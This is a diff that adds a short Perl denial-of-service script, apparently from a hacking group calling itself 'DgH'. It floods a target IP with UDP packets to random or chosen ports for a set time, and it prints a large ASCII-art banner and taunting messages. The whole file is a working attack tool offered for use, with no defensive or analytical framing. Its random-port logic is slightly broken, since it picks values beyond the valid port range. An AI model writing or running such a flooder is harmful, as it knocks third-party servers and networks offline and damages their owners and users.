@@ -1,0 +1,56 @@
+#!/usr/bin/perl
+
+##
+# DgH By SnowmaN<----
+##
+
+use Socket;
+use strict;
+
+my ($ip,$port,$size,$time) = @ARGV;
+
+my ($iaddr,$endtime,$psize,$pport);
+
+$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
+$endtime = time() + ($time ? $time : 100);
+socket(flood, PF_INET, SOCK_DGRAM, 17);
+
+print <<EOTEXT;
+
+DDDDDDDDDDDDD                           HHHHHHHHH     HHHHHHHHH
+D::::::::::::DDD                        H:::::::H     H:::::::H
+D:::::::::::::::DD                      H:::::::H     H:::::::H
+DDD:::::DDDDD:::::D                     HH::::::H     H::::::HH
+  D:::::D    D:::::D    ggggggggg   ggggg H:::::H     H:::::H  
+  D:::::D     D:::::D  g:::::::::ggg::::g H:::::H     H:::::H  
+  D:::::D     D:::::D g:::::::::::::::::g H::::::HHHHH::::::H  
+  D:::::D     D:::::Dg::::::ggggg::::::gg H:::::::::::::::::H  
+  D:::::D     D:::::Dg:::::g     g:::::g  H:::::::::::::::::H  
+  D:::::D     D:::::Dg:::::g     g:::::g  H::::::HHHHH::::::H  
+  D:::::D     D:::::Dg:::::g     g:::::g  H:::::H     H:::::H  
+  D:::::D    D:::::D g::::::g    g:::::g  H:::::H     H:::::H  
+DDD:::::DDDDD:::::D  g:::::::ggggg:::::gHH::::::H     H::::::HH
+D:::::::::::::::DD    g::::::::::::::::gH:::::::H     H:::::::H
+D::::::::::::DDD       gg::::::::::::::gH:::::::H     H:::::::H
+DDDDDDDDDDDDD            gggggggg::::::gHHHHHHHHH     HHHHHHHHH
+                                 g:::::g                       
+                     gggggg      g:::::g                       
+                     g:::::gg   gg:::::g                       
+                      g::::::ggg:::::::g                       
+                       gg:::::::::::::g                        
+                         ggg::::::ggg                          
+                            gggggg      
+							
+ DgH By SnowmaN, Leader Of Team DgH Official "Script Coded For my DgH Members"
+EOTEXT
+
+print "::Get @ Me Random:: $ip " . ($port ? $port : "random") . " Disrespected = " .
+  ($size ? "$size-byte" : "Disconnected :)") . " ~SnowmaN~ " .
+  ($time ? " for $time seconds" : "") . "\n";
+print "Break with Ctrl-C\n" unless $time;
+
+for (;time() <= $endtime;) {
+  $psize = $size ? $size : int(rand(1024-64)+64) ;
+  $pport = $port ? $port : int(rand(1500000))+1;
+
+  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
